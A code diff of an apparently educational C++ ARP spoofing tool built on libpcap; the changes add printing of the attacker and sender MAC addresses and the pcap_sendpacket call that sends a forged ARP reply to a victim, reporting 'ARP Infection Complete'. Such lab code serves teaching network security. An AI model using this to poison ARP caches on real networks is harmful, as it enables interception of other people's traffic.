@@ -40,9 +40,9 @@ int main(int argc, char* argv[]) {
 	// find attacker's mac address
 	find_mac(attacker_mac, argv);
 	// print attacker's mac address
-	printf("My MAC : %s\n", attacker_mac);
+	printf("My(Attacker) MAC : %s\n", attacker_mac);
 	find_ip(attacker_ip, argv);
-	printf("My IP : %s\n", attacker_ip);
+	printf("My(Attacker) IP : %s\n", attacker_ip);
 	///////////////////////////////////////////////
 
 
@@ -97,6 +97,8 @@ int main(int argc, char* argv[]) {
 		}
 	}
 	
+	printf("Sender MAC : %s\n", sender_mac);
+	
 	packet.eth_.dmac_ = Mac(sender_mac);
 	packet.eth_.smac_ = Mac(attacker_mac);
 	packet.eth_.type_ = htons(EthHdr::Arp);
@@ -111,7 +113,19 @@ int main(int argc, char* argv[]) {
 	packet.arp_.tmac_ = Mac(sender_mac);
 	packet.arp_.tip_ = htonl(Ip(argv[2]));
 
-	printf("%s\n", sender_mac);
+	
 
+	res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
+	if (res != 0) 
+	{
+		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
+	}
+	else
+	{
+		printf("ARP Infection Complete\n");
+	}
+	
 	pcap_close(handle);
+	
+	return 0;
 }
